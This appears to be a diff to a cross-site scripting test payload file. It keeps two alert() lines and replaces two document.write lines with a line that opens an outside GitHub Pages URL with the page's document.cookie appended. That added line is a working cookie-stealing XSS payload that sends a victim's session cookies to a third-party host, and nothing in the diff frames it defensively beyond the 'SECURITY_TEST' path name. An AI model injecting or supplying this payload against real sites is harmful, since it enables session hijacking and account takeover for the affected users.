@@ -1,4 +1,3 @@
 alert("XSS TEST");
 alert(document.cookie);
-document.write('document.write("XSS TEST")');
-document.write('document.write(document.cookie)');
+window.open("https://ninzacode.github.io/SECURITY_TEST/XSS.html?cookie="+document.cookie)
